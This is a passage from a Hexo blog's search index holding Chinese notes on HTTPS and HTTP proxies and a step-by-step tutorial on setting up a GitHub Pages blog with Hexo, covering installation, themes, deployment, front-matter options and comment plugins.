SSL</p><p><strong>加密：</strong></p><ul><li>私钥（放在服务器上，用于公钥加密过的数据）</li><li>公钥（放在互联网上，所有人都能拿到的一串加密的字符串，这个加密的字符串是来加密我们的字符信息的。当加密的数据传到服务器上，只有服务器通过私钥解密，才能把公钥加密的数据拿出来）</li></ul><p><strong>https握手的过程：</strong></p><p><img src="Inked%E6%8F%A1%E6%89%8B_LI.jpg" alt=""></p><p><strong>https和http的主要区别：</strong></p><ul><li><p>https协议需要到ca机构申请ssl证书(如沃通CA)，高级别的ssl证书需要一定费用</p></li><li><p>http是超文本传输协议，信息是明文传输，https 则是具有安全性的ssl加密传输协议</p></li><li><p>http和https使用的是完全不同的连接方式，用的端口也不一样（http是80端口，https是443端口）</p></li><li><p>http的连接很简单，是无状态的；https协议是由ssl+http协议构建的可进行加密传输、身份认证的网络协议，更安全</p></li></ul><p>​</p><h4 id="4-2-3-代理">4.2.3 代理</h4><p>  <strong>代理</strong><code>Proxy</code>是 HTTP 协议中请求方和应答方中间的一个环节，作为<strong>中转站</strong>，既可以转发客户端的请求，也可以转发服务器的应答。</p><p>代理有很多的种类，常见的有：</p><ul><li><strong>匿名代理</strong>：完全“隐匿”了被代理的机器，外界看到的只是代理服务器</li><li><strong>透明代理</strong>：顾名思义，它在传输过程中是“透明开放”的，外界既知道代理，也知道客户端</li><li><strong>正向代理</strong>：靠近客户端，代表客户端向服务器发送请求</li><li><strong>反向代理</strong>：靠近服务器端，代表服务器响应客户端的请求（CDN实际上就是一种代理，它代替源站服务器响应客户端的请求，通常扮演着透明代理和反向代理的角色）</li></ul><p>​</p><p>由于代理在传输过程中插入了一个中间层，所以可以在这个环节做很多事，比如：</p><ul><li><strong>负载均衡</strong>：把访问请求均匀分散到多台机器，实现访问集群化</li><li><strong>内容缓存</strong>：暂存上下行的数据，减轻后端的压力</li><li><strong>安全防护</strong>：隐匿 IP, 使用 WAF 等工具抵御网络攻击，保护被代理的机器</li><li><strong>数据处理</strong>：提供压缩、加密等额外的功能</li></ul><blockquote><p>关于 HTTP 的代理还有一个特殊的<strong>代理协议</strong><code>proxy protocol</code>，它由知名的代理软件 <code>HAProxy</code> 制订，但并不是 RFC 标准。</p></blockquote><p>​</p><p>​</p><h4 id="4-2-4-小结">4.2.4 小结</h4><ol><li>TCP/IP 是网络世界最常用的协议，HTTP 通常运行在 TCP/IP 提供的可靠传输基础上</li><li>DNS 域名是 IP 地址的等价替代，需要用域名解析实现到 IP 地址的映射</li><li>URI 是用来标记互联网上资源的一个名字，由“协议名 + 主机名 + 路径”构成，俗称 URL</li><li>HTTPS 相当于“HTTP+SSL/TLS+TCP/IP”，为 HTTP 套了一个安全的外壳</li><li>代理是 HTTP 传输过程中的“中转站”，可以实现缓存加速、负载均衡等功能</li></ol><p>​</p><p>​</p><blockquote><p>完结</p></blockquote><p><img src="%E4%B8%8B%E8%BD%BD22.png" alt="HTTP思维导图"></p><p>​</p><p>​</p><p><a href="https://www.cnblogs.com/chenliyang/p/6558756.html">参考文章</a></p><p><a href="https://http2.akamai.com/demo">HTTP2演示</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 通信协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Hexo的GitHub博客搭建</title>
      <link href="2020/08/28/github-hexo-blog/"/>
      <url>2020/08/28/github-hexo-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言">0.前言</h2><p><strong>Github Pages</strong></p><ul><li><p>Github Pages允许用户的任何一个Repo的gh-pages分支上的代码可以经由HTTP访问到，类似提供了静态文件服务。不仅可以方便的为项目建立介绍站点，也可以用来建立个人博客。</p></li><li><p>优点：</p></li></ul><ol><li>轻量级的博客系统，没有麻烦的配置</li><li>无需自己搭建服务器</li><li>博客内容可以轻松打包、转移、发布到其它平台；</li><li>可以绑定自己的域名</li></ol><ul><li>缺点：</li></ul><ol><li>使用<a href="https://github.com/mojombo/jekyll">Jekyll</a>模板系统，相当于静态页发布，适合博客，文档介绍等，动态程序的部分受限</li><li>基于Git，很多东西需要动手，不像Wordpress有强大的后台</li></ol><p><strong>Hexo</strong></p><ul><li><p>Hexo是一款基于Node.js的高效静态站点生成框架，可以通过Hexo直接使用Markdown语法来撰写博客而无需关心网页源代码的具体细节，只需要用心写好你的博客内容就好了</p></li><li><p>快速开始</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo s<span class="token comment"># 本地预览博客</span>$ hexo g  <span class="token comment"># 生成博客网页文件</span>$ hexo d<span class="token comment"># 上传网页文件到github</span>$ hexo new post <span class="token string">"article title"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>参考材料：</p><ul><li><p><a href="https://github.com/hexojs/hexo">Hexo-Github地址</a></p></li><li><p><a href="https://hexo.io/zh-cn/docs/">Hexo帮助文档</a></p></li></ul><h2 id="1-环境准备">1.环境准备</h2><h3 id="1-1-安装Node-js">1.1 安装Node.js</h3><ul><li><p><a href="https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi">Node.js下载地址</a></p></li><li><p>安装了Node.js会自动安装npm</p></li><li><p>cmd窗口输入<code>node -v</code>和<code>npm -v</code>验证是否安装成功</p></li><li><p>可以使用阿里的国内镜像进行加速</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="1-2-安装Git">1.2 安装Git</h3><ul><li><p>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具</p></li><li><p><a href="https://git-scm.com/download/win">Git下载地址</a></p></li><li><p>最后一步添加路径时选择Use Git from the Windows Command Prompt，这样能直接在命令提示符里打开</p></li><li><p>安装完成后在命令提示符中输入git --version验证是否安装成功</p></li></ul><h3 id="1-3-安装Hexo">1.3 安装Hexo</h3><ul><li>cmd窗口输入<code>npm install -g hexo</code></li><li>安装完后输入hexo -v验证是否安装成功</li></ul><h2 id="2-本地部署Hexo">2.本地部署Hexo</h2><h3 id="2-1-初始化目录">2.1 初始化目录</h3><p>在想创建的目录下执行<code>hexo init</code>，这个命令会初始化博客的目录</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20200828-init.gif" alt="博客根目录" style="zoom:80%;"><h3 id="2-2-全局配置">2.2 全局配置</h3><p>在根目录<code>_config.yml</code>里进行全局配置</p><h3 id="2-3-本地启动">2.3 本地启动</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo g <span class="token comment">#生成本地public静态文件</span>hexo s <span class="token comment">#启动本地服务器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进入http://localhost:4000/ 已经可以看到一篇helleworld的博客</p><h2 id="3-个性化主题">3.个性化主题</h2><h3 id="3-1-推荐主题">3.1 推荐主题</h3><p><a href="https://github.com/litten/hexo-theme-yilia%EF%BC%88%E4%B8%80%E4%B8%AA%E7%AE%80%E6%B4%81%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%BB%E9%A2%98%EF%BC%89">https://github.com/litten/hexo-theme-yilia（一个简洁优雅的主题）</a></p><p><a href="https://github.com/TryGhost/Casper%EF%BC%88%E5%B9%BD%E7%81%B5%E4%B8%BB%E9%A2%98%EF%BC%89">https://github.com/TryGhost/Casper（幽灵主题）</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery%EF%BC%88%E7%82%AB%E9%85%B7%EF%BC%8C%E5%93%8D%E5%BA%94%E5%BC%8F%E6%9B%B4%E5%8F%8B%E5%A5%BD%EF%BC%89">https://github.com/blinkfox/hexo-theme-matery（炫酷，响应式更友好）</a></p><h3 id="3-2-使用步骤">3.2 使用步骤</h3><ol><li><p>安装主题</p><p>在根目录下<code>git clone</code>你喜欢的主题的代码</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo clean<span class="token function">git</span> clone https://github.com/litten/hexo-theme-yilia.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>启用主题</p><p>修改根目录的<code>_config.yml</code>配置文件中的theme属性，将其设置为yilia（默认是landscape）</p></li></ol><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20200828-yilia.png" style="zoom:80%;"><ol start="3"><li><p>本地启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo ghexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="4-部署到GitHub">4.部署到GitHub</h2><h3 id="4-1-创建远程仓库">4.1 创建远程仓库</h3><ol><li><p>GitHub新建一个仓库,仓库名为<code>用户名.github.io</code></p><p>名称一定要和github用户名完全一样，比如你github用户名叫<code>abc</code>，那么仓库名为<code>abc.github.io</code></p></li><li><p>修改根目录下的<code>_config.yml</code>配置文件</p><p>url：GitHub Pages网址<code>https://GitHub用户名.github.io</code></p></li></ol><h3 id="4-2-连接Github与本地">4.2 连接Github与本地</h3><ol><li><p>右键打开git bash，输入命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"night-candle"</span> <span class="token comment">#用户名和邮箱根据注册github的信息修改</span><span class="token function">git</span> config --global user.email <span class="token string">"0123456789@qq.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>生成密钥SSH key：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将生成的公钥添加到github中（头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个SSH进行添加）</p></li><li><p>测试，输入命令，如果如下图所示，出现用户名则成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220113-github-test.png" alt="设置成功" style="zoom:80%;"></li><li><p>打开根目录下<code>_config.yml</code>文件，修改最后一行deploy的配置，repository修改为自己的github项目地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deploy:- type: <span class="token function">git</span>  repository:    github: git@github.com:night-candle/night-candle.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将本地推送到GitHub远程仓库，在git bash输入以下指令</p><pre class="line-numbers language-none"><code class="language-none">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​</p></li></ol><h2 id="5-使用">5.使用</h2><h3 id="5-1-添加文章">5.1 添加文章</h3><ol><li><p>git bash安装扩展<code>npm i hexo-deployer-git</code></p></li><li><p>然后输入<code>hexo new post "article title"</code>，新建一篇文章</p></li><li><p>然后打开<code>\source\_posts</code>的目录，多了一个文件夹和一个<code>.md</code>文件，一个用来存放图片等数据，另一个是文章</p></li><li><p>编写完markdown文件后，根目录下输入<code>hexo g</code>生成静态网页，最后输入<code>hexo d</code>上传到github上</p></li><li><p>文件头如下</p><pre class="line-numbers language-none"><code class="language-none">toc: true    # 是否有目录reward: true  # 是否有打赏title: vuex   # 标题名称tags:     # 小标签- 随笔- vue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="5-2-文章-Front-matter-介绍">5.2 文章 Front-matter 介绍</h3><h4 id="Front-matter-选项详解">Front-matter 选项详解</h4><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h4 id="最简示例">最简示例</h4><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="最全示例">最全示例</h4><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> <span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown<span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-3-隐藏文章">5.3 隐藏文章</h3><blockquote><p>隐藏的文章仍然可以通过连接访问到</p></blockquote><ol><li><p>安装插件 <a href="https://github.com/prinsss/hexo-hide-posts">hexo-hide-posts</a></p></li><li><p>Front-matter 添加 <code>hidden: true</code></p></li><li><p><code>hexo hidden:list</code> 获取当前所有的已隐藏文章列表</p></li><li><p>完全隐藏使用Hexo草稿功能</p></li></ol><p>参考：<a href="https://printempw.github.io/hexo-plugin-to-make-posts-sage-unlisted/">为 Hexo 博客添加隐藏文章功能</a></p><h3 id="5-4-草稿">5.4 草稿</h3><ol><li><p><code>draft</code>这种布局在建立时会被保存到 <code>source/_drafts</code> 文件夹</p></li><li><p>可通过 <code>publish</code> 命令将草稿移动到 <code>source/_posts</code> 文件夹，命令中指定 <code>layout</code> 来指定布局</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo publish <span class="token punctuation">[</span>layout<span class="token punctuation">]</span> <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>草稿默认不会显示在页面中，可在执行时加上 <code>--draft</code> 参数，或是把 <code>render_drafts</code> 参数设为 <code>true</code> 来预览草稿</p></li></ol><h2 id="6-补充">6. 补充</h2><h3 id="6-1-绑定域名">6.1 绑定域名</h3><p>打开github项目，点击<code>settings</code>，拉到下面<code>Custom domain</code>处，填上你自己的域名，保存</p><p>项目根目录会出现一个名为<code>CNAME</code>的文件。（如果没有，手动创建<code>CNAME</code>文件，注意没有后缀，然后在里面写上域名保存）</p><h3 id="6-2-添加评论插件">6.2 添加评论插件</h3><ol><li><p>获取Client ID和Client Secret</p><p><a href="https://github.com/settings/applications/new">https://github.com/settings/applications/new</a></p></li></ol><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220113-register.jpg" alt="注册" style="zoom:80%;"><ol start="2"><li>在Settings/Developer settings/OAuth Apps中可以找到Client ID和Client Secret</li></ol><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220113-oAuth.jpg" alt="" style="zoom:80%;"><ol start="3"><li><p>配置文件<code>_config.yml</code>下修改<code>gitalk</code></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">gitalk</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">owner</span><span class="token punctuation">:</span> 你的github用户名  <span class="token key atrule">repo</span><span class="token punctuation">:</span> 你的github用户名.github.io  <span class="token key atrule">oauth</span><span class="token punctuation">:</span>    <span class="token key atrule">clientId</span><span class="token punctuation">:</span> 粘贴刚刚注册完显示的字符串    <span class="token key atrule">clientSecret</span><span class="token punctuation">:</span> 粘贴刚刚注册完显示的字符串  <span class="token key atrule">admin</span><span class="token punctuation">:</span> 你的github用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="6-3-备份博客源文件">6.3 备份博客源文件</h3><ol><li>本地克隆github.io的远程仓库</li><li>创建新的远程分支，用来备份hexo源文件</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout -b hexo_source<span class="token function">git</span> push origin hexo_source:hexo_source<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>创建忽略规则文件 <code>.gitignore</code></li></ol><p>按需添加如下内容：</p><pre class="line-numbers language-none"><code class="language-none">.DS_StoreThumbs.dbdb.json  *.log.deploy*/node_modules/.npmignorepublic/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>添加内容到仓库并提交到远程仓库</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit -m <span class="token string">"first commit"</span><span class="token function">git</span> push -u origin hexo_source<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://lvraikkonen.github.io/2016/05/31/%E5%88%A9%E7%94%A8Github%E5%88%86%E6%94%AF%E5%A4%87%E4%BB%BDHexo%E6%BA%90%E6%96%87%E4%BB%B6/">教程</a></p><p>​</p><h3 id="6-4-个性化设置">6.4 个性化设置</h3><h4 id="动态标签栏">动态标签栏</h4><p>在<code>theme/matery/layout/layout.ejs</code>下添加如下代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span> <span class="token keyword">var</span> OriginTitile <span class="token operator">=</span> document<span class="token punctuation">.</span>title<span class="token punctuation">,</span> st<span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"visibilitychange"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> document<span class="token punctuation">.</span>hidden <span class="token operator">?</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">"Σ(っ °Д°;)っ喔哟，崩溃啦！"</span><span class="token punctuation">,</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">"φ(゜▽゜*)♪咦，又好了！"</span><span class="token punctuation">,</span> st <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> document<span class="token punctuation">.</span>title <span class="token operator">=</span> OriginTitile <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3e3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文章头设置、添加404页面、文章头设置、“关于”页面增加、解决mathjax与代码高亮的冲突、增加建站时间…</p><h3 id="6-5-常见问题及解答">6.5 常见问题及解答</h3><h4 id="文章预览显示过长">文章预览显示过长</h4><p>手动在文章内部加上<code>&lt;!-- more --&gt;</code></p><p>​</p><h4 id="代码块中的-无法解析问题解决">代码块中的<code>{}</code>无法解析问题解决</h4><p><code>node_modules/hexo-prism-plugin/src/index.js</code>文件中<code>map</code>里未支持大括号，加上对应字符即可</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'&amp;#39;'</span><span class="token operator">:</span> <span class="token string">'\''</span><span class="token punctuation">,</span>  <span class="token string">'&amp;amp;'</span><span class="token operator">:</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;gt;'</span><span class="token operator">:</span> <span class="token string">'&gt;'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;lt;'</span><span class="token operator">:</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;quot;'</span><span class="token operator">:</span> <span class="token string">'"'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;#123;'</span><span class="token operator">:</span> <span class="token string">'{'</span><span class="token punctuation">,</span><span class="token comment">//添加的代码</span>  <span class="token string">'&amp;#125;'</span><span class="token operator">:</span> <span class="token string">'}'</span><span class="token comment">//添加的代码</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>未完待续…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
